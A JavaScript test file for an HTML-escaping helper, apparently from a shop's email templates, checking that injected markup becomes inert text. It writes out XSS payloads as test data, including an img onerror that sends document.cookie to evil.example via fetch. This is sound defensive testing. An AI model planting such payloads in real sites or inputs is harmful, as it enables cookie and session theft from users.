/**
 * The payloads Eric asked for, written down so they stay refused.
 *
 * "send an email with angle brackets link tags and script tags in every input
 * field if any render as a clickable link instead of a plain text your
 * template is fully injectable" — 2026-11-14. The fulfilment email was: a
 * shopper's own `customerName` went into it unescaped.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { escapeHtml, escapeAttr, escapeHtmlWithBreaks } from '../supabase/functions/server/escapeHtml.ts';

const ANCHOR = '<a href="https://evil.example/steal">click me</a>';
const SCRIPT = '<script>alert(1)</script>';
const IMG = '<img src=x onerror=alert(1)>';

test('a link tag becomes text, not a clickable link', () => {
  const out = escapeHtml(ANCHOR);
  assert.ok(!/<a\s/i.test(out), 'an anchor survived as markup');
  assert.ok(out.includes('&lt;a href=&quot;'), 'should read as escaped text');
});

test('a script tag becomes text', () => {
  assert.ok(!/<script/i.test(escapeHtml(SCRIPT)));
});

test('an image with an error handler cannot become a tag', () => {
  const out = escapeHtml(IMG);
  assert.ok(!/<img/i.test(out));
  // The words may remain as text — what matters is that no tag opens.
  assert.ok(out.startsWith('&lt;img'));
});

test('ampersand is escaped first, so entities are not double-escaped', () => {
  assert.equal(escapeHtml('&'), '&amp;');
  assert.equal(escapeHtml('&lt;'), '&amp;lt;');
  assert.equal(escapeHtml('a & b'), 'a &amp; b');
});

test('a quote cannot close an attribute and start a handler', () => {
  const payload = '" onmouseover="alert(1)';
  assert.ok(!escapeHtml(payload).includes('"'));
  const attr = escapeAttr(payload);
  assert.ok(!attr.includes('"') && !attr.includes('='));
});

test('escapeAttr also neutralises backtick and equals', () => {
  assert.equal(escapeAttr('x=`y`'), 'x&#61;&#96;y&#96;');
});

test('null and undefined are empty, never the literal words', () => {
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
  assert.equal(escapeHtmlWithBreaks(null), '');
});

test('line breaks survive as br, and nothing else does', () => {
  assert.equal(
    escapeHtmlWithBreaks('hello\n<b>there</b>'),
    'hello<br>&lt;b&gt;there&lt;/b&gt;',
  );
});

test('a realistic hostile customer name is inert', () => {
  const name = `Bob <img src=x onerror="fetch('https://evil.example?c='+document.cookie)">`;
  const out = escapeHtml(name);
  assert.ok(!out.includes('<img'));
  assert.ok(!out.includes('"'));
  assert.ok(out.startsWith('Bob &lt;img'));
});
